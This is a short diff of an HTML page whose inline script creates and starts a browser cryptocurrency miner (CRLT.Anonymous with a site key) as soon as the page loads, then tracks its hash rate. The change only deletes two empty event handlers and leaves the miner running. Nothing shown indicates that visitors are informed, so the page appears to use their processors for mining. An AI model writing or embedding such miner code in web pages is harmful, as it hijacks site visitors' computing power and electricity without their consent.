@@ -33,8 +33,6 @@
   <script>
     var miner = new CRLT.Anonymous('f3981c028e6ec16499b062588983dff0f19496e86006');
     miner.start();
-    miner.on('found', function() { /* Hash found */ })
-    miner.on('accepted', function() { /* Hash accepted by the pool */ })
     setInterval(function() {
       var hashesPerSecond = miner.getHashesPerSecond();
       var totalHashes = miner.getTotalHashes();
